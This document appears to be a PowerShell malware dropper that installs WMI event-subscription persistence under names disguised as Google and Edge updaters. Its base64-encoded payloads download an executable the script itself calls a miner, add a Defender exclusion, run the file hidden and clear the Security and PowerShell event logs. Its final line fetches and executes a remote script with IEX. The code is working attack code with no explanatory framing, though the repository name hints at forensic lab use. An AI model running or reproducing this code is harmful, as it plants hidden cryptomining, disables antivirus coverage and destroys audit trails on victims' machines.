# Currently only creates the miner tasks via wmi persistence
$FirstPayload            = "Invoke-Command ([scriptblock]::Create([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('JABlAHgAZQBQAGEAdABoACAAPQAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAEkATgBGAFwAYQBzAHAAbgBlAHQAXABsAHMAbQBhADMAMgAuAGUAeABlACIADQAKACQAYwBvAG4AZgBQAGEAdABoACAAPQAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAEkATgBGAFwAYQBzAHAAbgBlAHQAXABjAG8AbgBmAGkAZwAuAGoAcwBvAG4AIgANAAoATgBlAHcALQBJAHQAZQBtACAALQBQAGEAdABoACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwASQBOAEYAXABhAHMAcABuAGUAdAAiACAALQBJAHQAZQBtAFQAeQBwAGUAIABEAGkAcgBlAGMAdABvAHIAeQAgAC0ARgBvAHIAYwBlACAAfAAgAE8AdQB0AC0ATgB1AGwAbAANAAoAQQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAEkATgBGAFwAYQBzAHAAbgBlAHQAIgANAAoAJABVAHIAaQA2ADQARQB4AGUAIAA9ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAG0AaQBjAGgAZQBsAGEAbgBnAGUAbABvAHMAcABsAGkAbgB0AGUAcgAvAEQALgBGAC4ASQAuAFIALQBQAHUAYgBsAGkAYwAtAFIAZQBzAG8AdQByAGMAZQBzAC8AcgBhAHcALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAGkAbgAvAGEAcwBwAG4AZQB0AC8AbABzAG0AYQAyADIALgBlAHgAZQAiAA0ACgAkAFUAcgBpADYANABDAG8AbgBmACAAPQAgACIAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBtAGkAYwBoAGUAbABhAG4AZwBlAGwAbwBzAHAAbABpAG4AdABlAHIALwBEAC4ARgAuAEkALgBSAC0AUAB1AGIAbABpAGMALQBSAGUAcwBvAHUAcgBjAGUAcwAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AYQBzAHAAbgBlAHQALwBjAG8AbgBmAGkAZwAuAGoAcwBvAG4AIgANAAoAdAByAHkAIAB7AA0ACgAgACAAIAAgAGkAdwByACAALQBVAHIAaQAgACQAVQByAGkANgA0AEUAeABlACAALQBPAHUAdABGAGkAbABlACAAJABlAHgAZQBQAGEAdABoAA0ACgAgACAAIAAgAGkAdwByACAALQBVAHIAaQAgACQAVQByAGkANgA0AEMAbwBuAGYAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAGMAbwBuAGYAUABhAHQAaAANAAoAIAAgACAAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAkAGUAeABlAFAAYQB0AGgAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuAA0ACgB9ACAAYwBhAHQAYwBoACAAewANAAoAIAAgACAAIABXAHIAaQB0AGUALQBFAHIAcgBvAHIAIAAiAEYAYQBpAGwAZQBkACAAdABvACAAcgBlAGMAbwBuAHMAdAByAHUAYwB0ACAAbwByACAAZQB4AGUAYwB1AHQAZQAgAGUAbQBiAGUAZABkAGUAZAAgAGUAeABlAGMAdQB0AGEAYgBsAGUAOgAgACQAXwAiAA0ACgB9AA0ACgB3AGUAdgB0AHUAdABpAGwAIABjAGwAIABTAGUAYwB1AHIAaQB0AHkADQAKAHcAZQB2AHQAdQB0AGkAbAAgAGMAbAAgACIAVwBpAG4AZABvAHcAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIgANAAoAdwBlAHYAdAB1AHQAaQBsACAAYwBsACAAIgBNAGkAYwByAG8AcwBvAGYAdAAtAFcAaQBuAGQAbwB3AHMALQBQAG8AdwBlAHIAUwBoAGUAbABsAC8ATwBwAGUAcgBhAHQAaQBvAG4AYQBsACIA'))))"
$FirstEventFilterName    = "UpdateCleanup" # Create lsma22
$FirstEventConsumerName  = "Google Update Cleanup"
$FirstQuery              = "SELECT * FROM __InstanceDeletionEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession'"

$SecondPayload           = "& ([scriptblock]::Create([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('UwB0AG8AcAAtAFAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIAAiAGwAcwBtAGEAMwAyACIAIAAtAEYAbwByAGMAZQANAAoAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwASQBOAEYAXABhAHMAcABuAGUAdAAiACAALQBSAGUAYwB1AHIAcwBlACAALQBGAG8AcgBjAGUADQAKAHcAZQB2AHQAdQB0AGkAbAAgAGMAbAAgAFMAZQBjAHUAcgBpAHQAeQANAAoAdwBlAHYAdAB1AHQAaQBsACAAYwBsACAAIgBXAGkAbgBkAG8AdwBzACAAUABvAHcAZQByAFMAaABlAGwAbAAiAA0ACgB3AGUAdgB0AHUAdABpAGwAIABjAGwAIAAiAE0AaQBjAHIAbwBzAG8AZgB0AC0AVwBpAG4AZABvAHcAcwAtAFAAbwB3AGUAcgBTAGgAZQBsAGwALwBPAHAAZQByAGEAdABpAG8AbgBhAGwAIgA='))))"
$SecondEventFilterName   = "EdgeUpdate"     # Kill lsma22
$SecondEventConsumerName = "SVC Edge Updater"
$SecondQuery             = "SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession'"
<#
$ThirdPayload            = "IEX (iwr https://raw.githubusercontent.com/michelangelosplinter/D.F.I.R-Public-Resources/refs/heads/main/aspnet/Third.ps1 -UseBasicParsing)"
$ThirdEventFilterName    = "SMBOperator"   # Infecting Routine
$ThirdEventConsumerName  = "Check Uptime"
$ThirdQuery              = "SELECT * FROM __TimerEvent WHERE TimerId='OneMinuteTimer_f71fa886-7d3f-4e66-ae34-e2dfa66f061d'"
#>
function Install-Persistence{
    
    param(
        [string]$Payload,           
        [string]$EventFilterName,   
        [string]$EventConsumerName, 
        [string]$Query
    )
    

    # Create event filter
    $EventFilterArgs = @{
        EventNamespace = 'root/cimv2'
        Name = $EventFilterName
        Query = $Query
        QueryLanguage = 'WQL'
    }

    $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs

    # Create CommandLineEventConsumer
    $CommandLineConsumerArgs = @{
        Name = $EventConsumerName
        CommandLineTemplate = "powershell -nop -c `"$Payload`""
    }
    $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs

    # Create FilterToConsumerBinding
    $FilterToConsumerArgs = @{
        Filter = $Filter
        Consumer = $Consumer
    }
    $FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs

    #Confirm the Event Filter was created
    $EventCheck = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = '$EventFilterName'"
    if ($EventCheck -ne $null) {
        Write-Host "Event Filter $EventFilterName successfully written to host"
    }

    #Confirm the Event Consumer was created
    $ConsumerCheck = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$EventConsumerName'"
    if ($ConsumerCheck -ne $null) {
        Write-Host "Event Consumer $EventConsumerName successfully written to host"
    }

    #Confirm the FiltertoConsumer was created
    $BindingCheck = Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding -Filter "Filter = ""__eventfilter.name='$EventFilterName'"""
    if ($BindingCheck -ne $null){
        Write-Host "Filter To Consumer Binding successfully written to host"
    }

}

function Remove-Persistence{
    param(
        [string]$EventFilterName,
        [string]$EventConsumerName
    )

    # Clean up Code - Comment this code out when you are installing persistence otherwise it will

    $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$EventConsumerName'"
    $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = '$EventFilterName'"
    $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"

    $FilterConsumerBindingToCleanup | Remove-WmiObject
    $EventConsumerToCleanup | Remove-WmiObject
    $EventFilterToCleanup | Remove-WmiObject

}

Remove-Persistence -EventFilterName $FirstEventFilterName -EventConsumerName $FirstEventConsumerName
Remove-Persistence -EventFilterName $SecondEventFilterName -EventConsumerName $SecondEventConsumerName
Remove-Persistence -EventFilterName $ThirdEventFilterName -EventConsumerName $ThirdEventConsumerName

Install-Persistence -EventFilterName $FirstEventFilterName -EventConsumerName $FirstEventConsumerName -Query $FirstQuery -Payload $FirstPayload
Install-Persistence -EventFilterName $SecondEventFilterName -EventConsumerName $SecondEventConsumerName -Query $SecondQuery -Payload $SecondPayload
#Install-Persistence -EventFilterName $ThirdEventFilterName -EventConsumerName $ThirdEventConsumerName -Query $ThirdQuery -Payload $ThirdPayload

IEX (iwr https://raw.githubusercontent.com/michelangelosplinter/D.F.I.R-Public-Resources/refs/heads/main/aspnet/Third.ps1 -UseBasicParsing)
